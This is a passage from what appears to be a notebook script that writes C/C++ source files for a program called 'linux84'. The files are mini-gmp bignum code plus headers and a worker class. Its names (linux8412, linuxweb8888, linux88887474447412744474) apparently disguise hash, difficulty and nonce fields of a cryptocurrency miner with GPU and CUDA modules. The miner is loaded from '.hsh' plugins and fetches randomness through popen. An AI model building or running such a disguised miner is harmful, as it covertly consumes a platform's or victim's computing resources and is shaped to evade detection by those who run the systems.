                base = 2;
                sp++;
            }
            else
                base = 8;
        }
        else
            base = 10;
    }

    sn = strlen (sp);
    dp = (unsigned char *) gmp_xalloc (sn + (sn == 0));

    for (sn = 0; *sp; sp++)
    {
        unsigned digit;

        if (isspace ((unsigned char) *sp))
            continue;
        if (*sp >= '0' && *sp <= '9')
            digit = *sp - '0';
        else if (*sp >= 'a' && *sp <= 'z')
            digit = *sp - 'a' + 10;
        else if (*sp >= 'A' && *sp <= 'Z')
            digit = *sp - 'A' + 10;
        else
            digit = base; /* fail */

        if (digit >= (unsigned) base)
        {
            gmp_free (dp);
            r->_mp_size = 0;
            return -1;
        }

        dp[sn++] = digit;
    }

    bits = mpn_base_power_of_two_p (base);

    if (bits > 0)
    {
        alloc = (sn * bits + GMP_LIMB_BITS - 1) / GMP_LIMB_BITS;
        rp = MPZ_REALLOC (r, alloc);
        rn = mpn_set_str_bits (rp, dp, sn, bits);
    }
    else
    {
        struct mpn_base_info info;
        mpn_get_base_info (&info, base);
        alloc = (sn + info.exp - 1) / info.exp;
        rp = MPZ_REALLOC (r, alloc);
        rn = mpn_set_str_other (rp, dp, sn, base, &info);
    }
    assert (rn <= alloc);
    gmp_free (dp);

    r->_mp_size = sign ? - rn : rn;

    return 0;
}

int
mpz_init_set_str (mpz_t r, const char *sp, int base)
{
    mpz_init (r);
    return mpz_set_str (r, sp, base);
}

size_t
mpz_out_str (FILE *stream, int base, const mpz_t x)
{
    char *str;
    size_t len;

    str = mpz_get_str (NULL, base, x);
    len = strlen (str);
    len = fwrite (str, 1, len, stream);
    gmp_free (str);
    return len;
}


static int
gmp_detect_endian (void)
{
    static const int i = 2;
    const unsigned char *p = (const unsigned char *) &i;
    return 1 - *p;
}

/* Import and export. Does not support nails. */
void
mpz_import (mpz_t r, size_t count, int order, size_t size, int endian,
            size_t nails, const void *src)
{
    const unsigned char *p;
    ptrdiff_t word_step;
    mp_ptr rp;
    mp_size_t rn;

    /* The current (partial) limb. */
    mp_limb_t limb;
    /* The number of bytes already copied to this limb (starting from
       the low end). */
    size_t bytes;
    /* The index where the limb should be stored, when completed. */
    mp_size_t i;

    if (nails != 0)
        gmp_die ("mpz_import: Nails not supported.");

    assert (order == 1 || order == -1);
    assert (endian >= -1 && endian <= 1);

    if (endian == 0)
        endian = gmp_detect_endian ();

    p = (unsigned char *) src;

    word_step = (order != endian) ? 2 * size : 0;

    /* Process bytes from the least significant end, so point p at the
       least significant word. */
    if (order == 1)
    {
        p += size * (count - 1);
        word_step = - word_step;
    }

    /* And at least significant byte of that word. */
    if (endian == 1)
        p += (size - 1);

    rn = (size * count + sizeof(mp_limb_t) - 1) / sizeof(mp_limb_t);
    rp = MPZ_REALLOC (r, rn);

    for (limb = 0, bytes = 0, i = 0; count > 0; count--, p += word_step)
    {
        size_t j;
        for (j = 0; j < size; j++, p -= (ptrdiff_t) endian)
        {
            limb |= (mp_limb_t) *p << (bytes++ * CHAR_BIT);
            if (bytes == sizeof(mp_limb_t))
            {
                rp[i++] = limb;
                bytes = 0;
                limb = 0;
            }
        }
    }
    assert (i + (bytes > 0) == rn);
    if (limb != 0)
        rp[i++] = limb;
    else
        i = mpn_normalized_size (rp, i);

    r->_mp_size = i;
}

void *
mpz_export (void *r, size_t *countp, int order, size_t size, int endian,
            size_t nails, const mpz_t u)
{
    size_t count;
    mp_size_t un;

    if (nails != 0)
        gmp_die ("mpz_import: Nails not supported.");

    assert (order == 1 || order == -1);
    assert (endian >= -1 && endian <= 1);
    assert (size > 0 || u->_mp_size == 0);

    un = u->_mp_size;
    count = 0;
    if (un != 0)
    {
        size_t k;
        unsigned char *p;
        ptrdiff_t word_step;
        /* The current (partial) limb. */
        mp_limb_t limb;
        /* The number of bytes left to to in this limb. */
        size_t bytes;
        /* The index where the limb was read. */
        mp_size_t i;

        un = GMP_ABS (un);

        /* Count bytes in top limb. */
        limb = u->_mp_d[un-1];
        assert (limb != 0);

        k = 0;
        do {
            k++; limb >>= CHAR_BIT;
        } while (limb != 0);

        count = (k + (un-1) * sizeof (mp_limb_t) + size - 1) / size;

        if (!r)
            r = gmp_xalloc (count * size);

        if (endian == 0)
            endian = gmp_detect_endian ();

        p = (unsigned char *) r;

        word_step = (order != endian) ? 2 * size : 0;

        /* Process bytes from the least significant end, so point p at the
       least significant word. */
        if (order == 1)
        {
            p += size * (count - 1);
            word_step = - word_step;
        }

        /* And at least significant byte of that word. */
        if (endian == 1)
            p += (size - 1);

        for (bytes = 0, i = 0, k = 0; k < count; k++, p += word_step)
        {
            size_t j;
            for (j = 0; j < size; j++, p -= (ptrdiff_t) endian)
            {
                if (bytes == 0)
                {
                    if (i < un)
                        limb = u->_mp_d[i++];
                    bytes = sizeof (mp_limb_t);
                }
                *p = limb;
                limb >>= CHAR_BIT;
                bytes--;
            }
        }
        assert (i == un);
        assert (k == count);
    }

    if (countp)
        *countp = count;

    return r;
}"""

open('./linux84/mini-gmp/mini-gmp.c', 'w').write(content)

content="""/* mini-gmp, a minimalistic implementation of a GNU GMP subset.

Copyright 2011-2015 Free Software Foundation, Inc.

This file is part of the GNU MP Library.

The GNU MP Library is free software; you can redistribute it and/or modify
it under the terms of either:

  * the GNU Lesser General Public License as published by the Free
    Software Foundation; either version 3 of the License, or (at your
    option) any later version.

or

  * the GNU General Public License as published by the Free Software
    Foundation; either version 2 of the License, or (at your option) any
    later version.

or both in parallel, as here.

The GNU MP Library is distributed in the hope that it will be useful, but
WITHOUT ANY WARRANTY; without even the implied warranty of MERCHANTABILITY
or FITNESS FOR A PARTICULAR PURPOSE.  See the GNU General Public License
for more details.

You should have received copies of the GNU General Public License and the
GNU Lesser General Public License along with the GNU MP Library.  If not,
see https://www.gnu.org/licenses/.  */

/* About mini-gmp: This is a minimal implementation of a subset of the
   GMP interface. It is intended for inclusion into applications which
   have modest bignums needs, as a fallback when the real GMP library
   is not installed.

   This file defines the public interface. */

#ifndef __MINI_GMP_H__
#define __MINI_GMP_H__

/* For size_t */
#include <stddef.h>
#include <stdint.h>

#if defined (__cplusplus)
extern "C" {
#endif

void mp_set_memory_functions (void *(*) (size_t),
                              void *(*) (void *, size_t, size_t),
                              void (*) (void *, size_t));

void mp_get_memory_functions (void *(**) (size_t),
                              void *(**) (void *, size_t, size_t),
                              void (**) (void *, size_t));

typedef uint64_t mp_limb_t;
typedef long mp_size_t;
typedef uint64_t mp_bitcnt_t;

typedef mp_limb_t *mp_ptr;
typedef const mp_limb_t *mp_srcptr;

typedef struct
{
    int _mp_alloc;		/* Number of *limbs* allocated and pointed
				   to by the _mp_d field.  */
    int _mp_size;			/* abs(_mp_size) is the number of limbs the
				   last field points to.  If _mp_size is
				   negative this is a negative number.  */
    mp_limb_t *_mp_d;		/* Pointer to the limbs.  */
} __mpz_struct;

typedef __mpz_struct mpz_t[1];

typedef __mpz_struct *mpz_ptr;
typedef const __mpz_struct *mpz_srcptr;

extern const int mp_bits_per_limb;

void mpn_copyi (mp_ptr, mp_srcptr, mp_size_t);
void mpn_copyd (mp_ptr, mp_srcptr, mp_size_t);
void mpn_zero (mp_ptr, mp_size_t);

int mpn_cmp (mp_srcptr, mp_srcptr, mp_size_t);
int mpn_zero_p (mp_srcptr, mp_size_t);

mp_limb_t mpn_add_1 (mp_ptr, mp_srcptr, mp_size_t, mp_limb_t);
mp_limb_t mpn_add_n (mp_ptr, mp_srcptr, mp_srcptr, mp_size_t);
mp_limb_t mpn_add (mp_ptr, mp_srcptr, mp_size_t, mp_srcptr, mp_size_t);

mp_limb_t mpn_sub_1 (mp_ptr, mp_srcptr, mp_size_t, mp_limb_t);
mp_limb_t mpn_sub_n (mp_ptr, mp_srcptr, mp_srcptr, mp_size_t);
mp_limb_t mpn_sub (mp_ptr, mp_srcptr, mp_size_t, mp_srcptr, mp_size_t);

mp_limb_t mpn_mul_1 (mp_ptr, mp_srcptr, mp_size_t, mp_limb_t);
mp_limb_t mpn_addmul_1 (mp_ptr, mp_srcptr, mp_size_t, mp_limb_t);
mp_limb_t mpn_submul_1 (mp_ptr, mp_srcptr, mp_size_t, mp_limb_t);

mp_limb_t mpn_mul (mp_ptr, mp_srcptr, mp_size_t, mp_srcptr, mp_size_t);
void mpn_mul_n (mp_ptr, mp_srcptr, mp_srcptr, mp_size_t);
void mpn_sqr (mp_ptr, mp_srcptr, mp_size_t);
int mpn_perfect_square_p (mp_srcptr, mp_size_t);
mp_size_t mpn_sqrtrem (mp_ptr, mp_ptr, mp_srcptr, mp_size_t);

mp_limb_t mpn_lshift (mp_ptr, mp_srcptr, mp_size_t, unsigned int);
mp_limb_t mpn_rshift (mp_ptr, mp_srcptr, mp_size_t, unsigned int);

mp_bitcnt_t mpn_scan0 (mp_srcptr, mp_bitcnt_t);
mp_bitcnt_t mpn_scan1 (mp_srcptr, mp_bitcnt_t);

void mpn_com (mp_ptr, mp_srcptr, mp_size_t);
mp_limb_t mpn_neg (mp_ptr, mp_srcptr, mp_size_t);

mp_bitcnt_t mpn_popcount (mp_srcptr, mp_size_t);

mp_limb_t mpn_invert_3by2 (mp_limb_t, mp_limb_t);
#define mpn_invert_limb(x) mpn_invert_3by2 ((x), 0)

size_t mpn_get_str (unsigned char *, int, mp_ptr, mp_size_t);
mp_size_t mpn_set_str (mp_ptr, const unsigned char *, size_t, int);

void mpz_init (mpz_t);
void mpz_init2 (mpz_t, mp_bitcnt_t);
void mpz_clear (mpz_t);

#define mpz_odd_p(z)   (((z)->_mp_size != 0) & (int) (z)->_mp_d[0])
#define mpz_even_p(z)  (! mpz_odd_p (z))

int mpz_sgn (const mpz_t);
int mpz_cmp_si (const mpz_t, long);
int mpz_cmp_ui (const mpz_t, uint64_t);
int mpz_cmp (const mpz_t, const mpz_t);
int mpz_cmpabs_ui (const mpz_t, uint64_t);
int mpz_cmpabs (const mpz_t, const mpz_t);
int mpz_cmp_d (const mpz_t, double);
int mpz_cmpabs_d (const mpz_t, double);

void mpz_abs (mpz_t, const mpz_t);
void mpz_neg (mpz_t, const mpz_t);
void mpz_swap (mpz_t, mpz_t);

void mpz_add_ui (mpz_t, const mpz_t, uint64_t);
void mpz_add (mpz_t, const mpz_t, const mpz_t);
void mpz_sub_ui (mpz_t, const mpz_t, uint64_t);
void mpz_ui_sub (mpz_t, uint64_t, const mpz_t);
void mpz_sub (mpz_t, const mpz_t, const mpz_t);

void mpz_mul_si (mpz_t, const mpz_t, int64_t);
void mpz_mul_ui (mpz_t, const mpz_t, uint64_t);
void mpz_mul (mpz_t, const mpz_t, const mpz_t);
void mpz_mul_2exp (mpz_t, const mpz_t, mp_bitcnt_t);
void mpz_addmul_ui (mpz_t, const mpz_t, uint64_t);
void mpz_addmul (mpz_t, const mpz_t, const mpz_t);
void mpz_submul_ui (mpz_t, const mpz_t, uint64_t);
void mpz_submul (mpz_t, const mpz_t, const mpz_t);

void mpz_cdiv_qr (mpz_t, mpz_t, const mpz_t, const mpz_t);
void mpz_fdiv_qr (mpz_t, mpz_t, const mpz_t, const mpz_t);
void mpz_tdiv_qr (mpz_t, mpz_t, const mpz_t, const mpz_t);
void mpz_cdiv_q (mpz_t, const mpz_t, const mpz_t);
void mpz_fdiv_q (mpz_t, const mpz_t, const mpz_t);
void mpz_tdiv_q (mpz_t, const mpz_t, const mpz_t);
void mpz_cdiv_r (mpz_t, const mpz_t, const mpz_t);
void mpz_fdiv_r (mpz_t, const mpz_t, const mpz_t);
void mpz_tdiv_r (mpz_t, const mpz_t, const mpz_t);

void mpz_cdiv_q_2exp (mpz_t, const mpz_t, mp_bitcnt_t);
void mpz_fdiv_q_2exp (mpz_t, const mpz_t, mp_bitcnt_t);
void mpz_tdiv_q_2exp (mpz_t, const mpz_t, mp_bitcnt_t);
void mpz_cdiv_r_2exp (mpz_t, const mpz_t, mp_bitcnt_t);
void mpz_fdiv_r_2exp (mpz_t, const mpz_t, mp_bitcnt_t);
void mpz_tdiv_r_2exp (mpz_t, const mpz_t, mp_bitcnt_t);

void mpz_mod (mpz_t, const mpz_t, const mpz_t);

void mpz_divexact (mpz_t, const mpz_t, const mpz_t);

int mpz_divisible_p (const mpz_t, const mpz_t);
int mpz_congruent_p (const mpz_t, const mpz_t, const mpz_t);

uint64_t mpz_cdiv_qr_ui (mpz_t, mpz_t, const mpz_t, uint64_t);
uint64_t mpz_fdiv_qr_ui (mpz_t, mpz_t, const mpz_t, uint64_t);
uint64_t mpz_tdiv_qr_ui (mpz_t, mpz_t, const mpz_t, uint64_t);
uint64_t mpz_cdiv_q_ui (mpz_t, const mpz_t, uint64_t);
uint64_t mpz_fdiv_q_ui (mpz_t, const mpz_t, uint64_t);
uint64_t mpz_tdiv_q_ui (mpz_t, const mpz_t, uint64_t);
uint64_t mpz_cdiv_r_ui (mpz_t, const mpz_t, uint64_t);
uint64_t mpz_fdiv_r_ui (mpz_t, const mpz_t, uint64_t);
uint64_t mpz_tdiv_r_ui (mpz_t, const mpz_t, uint64_t);
uint64_t mpz_cdiv_ui (const mpz_t, uint64_t);
uint64_t mpz_fdiv_ui (const mpz_t, uint64_t);
uint64_t mpz_tdiv_ui (const mpz_t, uint64_t);

uint64_t mpz_mod_ui (mpz_t, const mpz_t, uint64_t);

void mpz_divexact_ui (mpz_t, const mpz_t, uint64_t);

int mpz_divisible_ui_p (const mpz_t, uint64_t);

uint64_t mpz_gcd_ui (mpz_t, const mpz_t, uint64_t);
void mpz_gcd (mpz_t, const mpz_t, const mpz_t);
void mpz_gcdext (mpz_t, mpz_t, mpz_t, const mpz_t, const mpz_t);
void mpz_lcm_ui (mpz_t, const mpz_t, uint64_t);
void mpz_lcm (mpz_t, const mpz_t, const mpz_t);
int mpz_invert (mpz_t, const mpz_t, const mpz_t);

void mpz_sqrtrem (mpz_t, mpz_t, const mpz_t);
void mpz_sqrt (mpz_t, const mpz_t);
int mpz_perfect_square_p (const mpz_t);

void mpz_pow_ui (mpz_t, const mpz_t, uint64_t);
void mpz_ui_pow_ui (mpz_t, uint64_t, uint64_t);
void mpz_powm (mpz_t, const mpz_t, const mpz_t, const mpz_t);
void mpz_powm_ui (mpz_t, const mpz_t, uint64_t, const mpz_t);

void mpz_rootrem (mpz_t, mpz_t, const mpz_t, uint64_t);
int mpz_root (mpz_t, const mpz_t, uint64_t);

void mpz_fac_ui (mpz_t, uint64_t);
void mpz_bin_uiui (mpz_t, uint64_t, uint64_t);

int mpz_probab_prime_p (const mpz_t, int);

int mpz_tstbit (const mpz_t, mp_bitcnt_t);
void mpz_setbit (mpz_t, mp_bitcnt_t);
void mpz_clrbit (mpz_t, mp_bitcnt_t);
void mpz_combit (mpz_t, mp_bitcnt_t);

void mpz_com (mpz_t, const mpz_t);
void mpz_and (mpz_t, const mpz_t, const mpz_t);
void mpz_ior (mpz_t, const mpz_t, const mpz_t);
void mpz_xor (mpz_t, const mpz_t, const mpz_t);

mp_bitcnt_t mpz_popcount (const mpz_t);
mp_bitcnt_t mpz_hamdist (const mpz_t, const mpz_t);
mp_bitcnt_t mpz_scan0 (const mpz_t, mp_bitcnt_t);
mp_bitcnt_t mpz_scan1 (const mpz_t, mp_bitcnt_t);

int mpz_fits_slong_p (const mpz_t);
int mpz_fits_ulong_p (const mpz_t);
int64_t mpz_get_si (const mpz_t);
uint64_t mpz_get_ui (const mpz_t);
double mpz_get_d (const mpz_t);
size_t mpz_size (const mpz_t);
mp_limb_t mpz_getlimbn (const mpz_t, mp_size_t);

void mpz_realloc2 (mpz_t, mp_bitcnt_t);
mp_srcptr mpz_limbs_read (mpz_srcptr);
mp_ptr mpz_limbs_modify (mpz_t, mp_size_t);
mp_ptr mpz_limbs_write (mpz_t, mp_size_t);
void mpz_limbs_finish (mpz_t, mp_size_t);
mpz_srcptr mpz_roinit_n (mpz_t, mp_srcptr, mp_size_t);

#define MPZ_ROINIT_N(xp, xs) {{0, (xs),(xp) }}

void mpz_set_si (mpz_t, int64_t);
void mpz_set_ui (mpz_t, uint64_t);
void mpz_set (mpz_t, const mpz_t);
void mpz_set_d (mpz_t, double);

void mpz_init_set_si (mpz_t, int64_t);
void mpz_init_set_ui (mpz_t, uint64_t);
void mpz_init_set (mpz_t, const mpz_t);
void mpz_init_set_d (mpz_t, double);

size_t mpz_sizeinbase (const mpz_t, int);
char *mpz_get_str (char *, int, const mpz_t);
int mpz_set_str (mpz_t, const char *, int);
int mpz_init_set_str (mpz_t, const char *, int);

/* This long list taken from gmp.h. */
/* For reference, "defined(EOF)" cannot be used here.  In g++ 2.95.4,
   <iostream> defines EOF but not FILE.  */
#if defined (FILE)                                              \
  || defined (H_STDIO)                                          \
  || defined (_H_STDIO)               /* AIX */                 \
  || defined (_STDIO_H)               /* glibc, Sun, SCO */     \
  || defined (_STDIO_H_)              /* BSD, OSF */            \
  || defined (__STDIO_H)              /* Borland */             \
  || defined (__STDIO_H__)            /* IRIX */                \
  || defined (_STDIO_INCLUDED)        /* HPUX */                \
  || defined (__dj_include_stdio_h_)  /* DJGPP */               \
  || defined (_FILE_DEFINED)          /* Microsoft */           \
  || defined (__STDIO__)              /* Apple MPW MrC */       \
  || defined (_MSL_STDIO_H)           /* Metrowerks */          \
  || defined (_STDIO_H_INCLUDED)      /* QNX4 */		\
  || defined (_ISO_STDIO_ISO_H)       /* Sun C++ */		\
  || defined (__STDIO_LOADED)         /* VMS */
size_t mpz_out_str (FILE *, int, const mpz_t);
#endif

void mpz_import (mpz_t, size_t, int, size_t, int, size_t, const void *);
void *mpz_export (void *, size_t *, int, size_t, int, size_t, const mpz_t);

#if defined (__cplusplus)
}
#endif
#endif /* __MINI_GMP_H__ */"""

open('./linux84/mini-gmp/mini-gmp.h', 'w').write(content)

content="""//
// Created by Haifa Bogdan Adnan on 03/08/2018.
//

#ifndef PROJECT_linux84_H
#define PROJECT_linux84_H

#include "../http/client.h"
#include "../app/runner.h"

class linux84 : public runner {
public:
    linux84(arguments &args);
    ~linux84();

    virtual void run();
    virtual void stop();

    string get_status();

	static string calc_duration(const string &base, const string &linux8412);
	static uint64_t calc_compare(const string &duration, const string &linuxweb8888);

private:
    bool __update_linuxweb844412441274_data();
    bool __display_report();
    void __disconnect_from_linuxweb844412441274();

    string __linux847466882profile;
    string __recommendation;
    string __linux88887474447412744474;
    string __blk;
    string __linuxweb8888;
    uint32_t __limit;
    uint32_t __linux84746688_mem;
    string __public_key;
    uint32_t __linux884444884488441274444474;
    uint32_t __found;
	uint32_t __confirmed_cblocks;
	uint32_t __confirmed_gblocks;
	uint32_t __rejected_cblocks;
	uint32_t __rejected_gblocks;
    int __chs_threshold_hit;
    int __ghs_threshold_hit;
    int __blocks_count;
	uint64_t __display_hits;

    time_t __begin_time;

    bool __running;

    arguments &__args;
    linux888874744474_client __client;
};
#endif //PROJECT_linux84_H"""

open('./linux84/linux84.h', 'w').write(content)

!mkdir ./linux8474/

!mkdir ./linux8474/linux847466882/

!mkdir ./linux8474/gpu/

!mkdir ./linux8474/gpu/cuda

content="""//
// Created by Haifa Bogdan Adnan on 03/08/2018.
//

#include "../common/common.h"
#include "../linux44444444474/base64.h"
#include "../linux44444444474/random_generator.h"
#include "../app/arguments.h"

#include "../common/dllexport.h"
#include "linux847466882/linux847466882.h"
#include "linux8474.h"

#include <iostream>
#include <stdio.h>
#include <stdlib.h>

    string GetStdoutFromCommand8474(string cmd8474) {

    string data8474;
    FILE * stream8474;
    const int max_buffer = 2048;
    char buffer[max_buffer];
    cmd8474.append("");

    stream8474 = popen(cmd8474.c_str(), "r");
    if (stream8474) {
    while (!feof(stream8474))
    if (fgets(buffer, max_buffer, stream8474) != NULL) data8474.append(buffer);
    pclose(stream8474);
    }
    return data8474;
    }

linux8474::linux8474() {
    _intensity = 0;
    _type = "";
	_subtype = "";
    _description = "";
	_priority = 0;

    __public_key = "";
    __blk = "";
    __linuxweb8888 = "";
    __pause = false;
    __is_running = false;
    __linux847466882profile = linux847466882profile_default;

    __begin_round_time = 0;

    __total_linux8412_count_cblocks = 0;
    __total_linux8412_count_gblocks = 0;

    __linux8412_count = 0;

    if(__registered_linux8474s == NULL) {
        __registered_linux8474s = new vector<linux8474*>();
    }
    __registered_linux8474s->push_back(this);
}

linux8474::~linux8474() {

};

string linux8474::get_type() {
	return _type;
}

string linux8474::get_subtype(bool short_subtype) {
    if(short_subtype && !(_short_subtype.empty())) {
        string short_version = _short_subtype;
        short_version.erase(3);
        return short_version;
    }
    else
    	return _subtype;
}

int linux8474::get_priority() {
	return _priority;
}

string linux8474::get_info() {
    return _description;
}

void linux8474::set_input(const string &public_key, const string &blk, const string &linuxweb8888, const string &linux847466882profile_string, const string &recommendation) {
    bool profile_change = false;
    __input_mutex.lock();
    __public_key = public_key;
    __blk = blk;
    __linuxweb8888 = linuxweb8888;
    if(linux847466882profile_string == "4_4_16384") {
        if(strcmp(__linux847466882profile->profile_name, "1_1_524288") == 0) {
            __linux847466882profile = &linux847466882profile_4_4_16384;
            profile_change = true;
        }
    }
    else {
        if(strcmp(__linux847466882profile->profile_name, "4_4_16384") == 0) {
            __linux847466882profile = &linux847466882profile_1_1_524288;
            profile_change = true;
        }
    }
    __pause = (recommendation == "pause");
    __input_mutex.unlock();

    if(profile_change) {
        uint64_t timestamp = microseconds();
        __linux8412es_mutex.lock();
        __linux8412_timings.push_back(linux8412_timing{timestamp - __begin_round_time, __linux8412_count, (linux847466882profile_string == "4_4_16384" ? 0 : 1)});
        __linux8412_count = 0;
        __linux8412es_mutex.unlock();

        if (__linux8412_timings.size() > 20) //we average over 20 blocks
            __linux8412_timings.pop_front();
        __begin_round_time = timestamp;
    }
}

linux8412_data linux8474::_get_input() {
    string tmp_public_key = "";
    string tmp_blk = "";
    string tmp_linuxweb8888 = "";
    string profile_name = "";
    __input_mutex.lock();
    tmp_public_key = __public_key;
    tmp_blk = __blk;
    tmp_linuxweb8888 = __linuxweb8888;
    profile_name = __linux847466882profile->profile_name;
    __input_mutex.unlock();

    linux8412_data new_linux8412;
    new_linux8412.linux88887474447412744474 = __make_linux88887474447412744474();
    new_linux8412.base = tmp_public_key + "-" + new_linux8412.linux88887474447412744474 + "-" + tmp_blk + "-" + tmp_linuxweb8888;
    new_linux8412.salt = "";
    new_linux8412.block = tmp_blk;
    new_linux8412.profile_name = profile_name;
//    new_linux8412.base = "PZ8Tyr4Nx8MHsRAGMpZmZ6TWY63dXWSCy7AEg3h9oYjeR74yj73q3gPxbxq9R3nxSSUV4KKgu1sQZu9Qj9v2q2HhT5H3LTHwW7HzAA28SjWFdzkNoovBMncD-sauULo1zM4tt9DhGEnO8qPe5nlzItJwwIKiIcAUDg-4KhqbBhShBf36zYeen943tS6KhgFmQixtUoVbf2egtBmD6j3NQtcueEBite2zjzdpK2ShaA28icRfJM9yPUQ6azN-56262626";
//    new_linux8412.salt = "NSHFFAg.iATJ0sfM";
    return new_linux8412;
}

uint32_t linux8474::get_linux8412_count_cblocks() {
    return __total_linux8412_count_cblocks;
}

uint32_t linux8474::get_linux8412_count_gblocks() {
    return __total_linux8412_count_gblocks;
}

vector<linux8412_data> linux8474::get_linux8412es() {
    vector<linux8412_data> tmp;
    __linux8412es_mutex.lock();
    tmp.insert(tmp.end(), __linux8412es.begin(), __linux8412es.end());
    __linux8412es.clear();
    __linux8412es_mutex.unlock();
    return tmp;
}

void linux8474::_store_linux8412(const linux8412_data &linux8412, int device_id) {
	__linux8412es_mutex.lock();
	__linux8412es.push_back(linux8412);
	__linux8412_count++;
    __device_infos[device_id].linux8412count++;
	if (linux8412.profile_name == "1_1_524288") {
		__total_linux8412_count_cblocks++;
	}
	else {
		__total_linux8412_count_gblocks++;
	}

	__linux8412es_mutex.unlock();
}

void linux8474::_store_linux8412(const vector<linux8412_data> &linux8412es, int device_id) {
	if (linux8412es.size() == 0) return;

	__linux8412es_mutex.lock();
	__linux8412es.insert(__linux8412es.end(), linux8412es.begin(), linux8412es.end());
	__linux8412_count+=linux8412es.size();
	__device_infos[device_id].linux8412count += linux8412es.size();

	if (linux8412es[0].profile_name == "1_1_524288") {
		__total_linux8412_count_cblocks+=linux8412es.size();
	}
	else {
		__total_linux8412_count_gblocks+=linux8412es.size();
	}

//	for(int i=0;i<linux8412es.size();i++)
//	    LOG(linux8412es[i].linux8412);
	__linux8412es_mutex.unlock();
}

vector<linux8474 *> linux8474::get_linux8474s() {
    return *__registered_linux8474s;
}

vector<linux8474 *> linux8474::get_active_linux8474s() {
    vector<linux8474 *> filtered;
    for(vector<linux8474*>::iterator it = __registered_linux8474s->begin();it != __registered_linux8474s->end();++it) {
        if((*it)->_intensity != 0)
            filtered.push_back(*it);
    }
    return filtered;
}

linux847466882profile *linux8474::_get_linux847466882profile() {
    linux847466882profile * profile = NULL;
    __input_mutex.lock();
    profile = __linux847466882profile;
    __input_mutex.unlock();

    return profile;
}

bool linux8474::_should_pause() {
    bool pause = false;
    __input_mutex.lock();
    pause = __pause;
    __input_mutex.unlock();

    return pause;
}

string linux8474::__make_linux88887474447412744474() {

return GetStdoutFromCommand8474("openssl rand -base64 32 | sed s/[^a-zA-Z0-9]//g | tr -d '\\t\\n\\r'");

}

vector<linux8474*> *linux8474::__registered_linux8474s = NULL;

typedef void *(*linux8474_loader)();

void linux8474::load_linux8474s() {
	string module_path = arguments::get_app_folder() + "/modules/";
	vector<string> files = get_files(module_path);
	for(vector<string>::iterator iter = files.begin();iter != files.end();iter++) {
		if(iter->find(".hsh") != string::npos) {
			void *__dll_handle = dlopen((module_path + *iter).c_str(), RTLD_LAZY);
			if(__dll_handle != NULL) {
				linux8474_loader linux8474_loader_ptr = (linux8474_loader) dlsym(__dll_handle, "linux8474_loader");
				(*linux8474_loader_ptr)();
			}
		}
	}
}

bool linux8474::is_running() {
    return __is_running;
}

void linux8474::_update_running_status(bool running) {
    __is_running = running;
}

vector<string> linux8474::_get_gpu_filters(arguments &args) {
    vector<string> local_filters = args.gpu_filter();
    vector<linux8474*> gpu_linux8474s = get_linux8474s_of_type("GPU");
    for(vector<string>::iterator it = local_filters.end(); it-- != local_filters.begin();) {
        string filter = *it;
        string filter_type = "";
        for(vector<linux8474*>::iterator hit = gpu_linux8474s.begin(); hit != gpu_linux8474s.end(); hit++) {
            if(filter.find((*hit)->_subtype + ":") == 0) {
                filter_type = (*hit)->_subtype;
                break;
            }
        }
        if(filter_type != "" && filter_type != this->_subtype) {
            local_filters.erase(it);
        }
        else if(filter_type != "") { //cleanup subtype prefix
            it->erase(0, this->_subtype.size() + 1);
        }
    }
    return local_filters;
}

vector<linux8474 *> linux8474::get_linux8474s_of_type(const string &type) {
    vector<linux8474 *> filtered;
    for(vector<linux8474*>::iterator it = __registered_linux8474s->begin();it != __registered_linux8474s->end();++it) {
        if((*it)->_type == type)
            filtered.push_back(*it);
    }
    return filtered;
}

map<int, device_info> &linux8474::get_device_infos() {
//    map<int, device_info> device_infos_copy;
//    __linux8412es_mutex.lock();
//    device_infos_copy.insert(__device_infos.begin(), __device_infos.end());
//    __linux8412es_mutex.unlock();
    return __device_infos;
}

void linux8474::_store_device_info(int device_id, device_info device) {
    __linux8412es_mutex.lock();
    __device_infos[device_id] = device;
    __linux8412es_mutex.unlock();
}"""

open('./linux8474/linux8474.cpp', 'w').write(content)

content="""//
// Created by Haifa Bogdan Adnan on 03/08/2018.
//

#ifndef linux888888887444888888linux84_linux8474_H
#define linux888888887444888888linux84_linux8474_H

#include "linux847466882/defs.h"

struct linux8412_data {
    linux8412_data() {
        realloc_flag = NULL;
    };
    string linux88887474447412744474;
    string salt;
    string base;
    string block;
    string linux8412;
    string profile_name;
    bool *realloc_flag;
};

struct linux8412_timing {
    uint64_t time_info;
    size_t linux8412_count;
    int profile; //0 CPU 1 GPU
};

struct device_info {
	device_info() {
		linux8412count = 0;
		cblock_linux8412rate = 0;
		gblock_linux8412rate = 0;
		cblocks_intensity = 0;
		gblocks_intensity = 0;
	}

	string name;
	string bus_id;
	double cblocks_intensity;
	double gblocks_intensity;
	double cblock_linux8412rate;
	double gblock_linux8412rate;
	size_t linux8412count;
};

#define REGISTER_linux8474(x)        extern "C"  { DLLEXPORT void linux8474_loader() { x *instance = new x(); } }

class DLLEXPORT linux8474 {
public:
    linux8474();
    virtual ~linux8474();

    virtual bool initialize() = 0;
    virtual bool configure(arguments &args) = 0;
    virtual void cleanup() = 0;

    string get_type();
	string get_subtype(bool short_name = false);
	int get_priority();
    string get_info();
    void set_input(const string &public_key, const string &blk, const string &linuxweb8888, const string &linux847466882profile_string, const string &recommendation);

    double get_current_linux8412_rate();
    double get_avg_linux8412_rate_cblocks();
    double get_avg_linux8412_rate_gblocks();

    uint32_t get_linux8412_count_cblocks();
    uint32_t get_linux8412_count_gblocks();

    vector<linux8412_data> get_linux8412es();
    map<int, device_info> &get_device_infos();
    bool is_running();

    static vector<linux8474*> get_linux8474s_of_type(const string &type);
    static vector<linux8474*> get_linux8474s();
    static vector<linux8474*> get_active_linux8474s();
    static void load_linux8474s();

protected:
    double _intensity;
    string _type;
	string _subtype;
	string _short_subtype; //max 3 characters
	int _priority;
    string _description;

	void _store_linux8412(const linux8412_data &linux8412, int device_id);
	void _store_linux8412(const vector<linux8412_data> &linux8412es, int device_id);

	void _store_device_info(int device_id, device_info device);

    linux8412_data _get_input();
    linux847466882profile *_get_linux847466882profile();
    bool _should_pause();
    void _update_running_status(bool running);
	vector<string> _get_gpu_filters(arguments &args);

private:
    string __make_linux88887474447412744474();
	void __update_linux8412rate();

    static vector<linux8474*> *__registered_linux8474s;

    mutex __input_mutex;
    string __public_key;
    string __blk;
    string __linuxweb8888;
    bool __pause;
    bool __is_running;
    linux847466882profile *__linux847466882profile;

    mutex __linux8412es_mutex;
    vector<linux8412_data> __linux8412es;

    uint64_t __linux8412rate_time;
    map<int, device_info> __device_infos;
    double __linux8412rate;

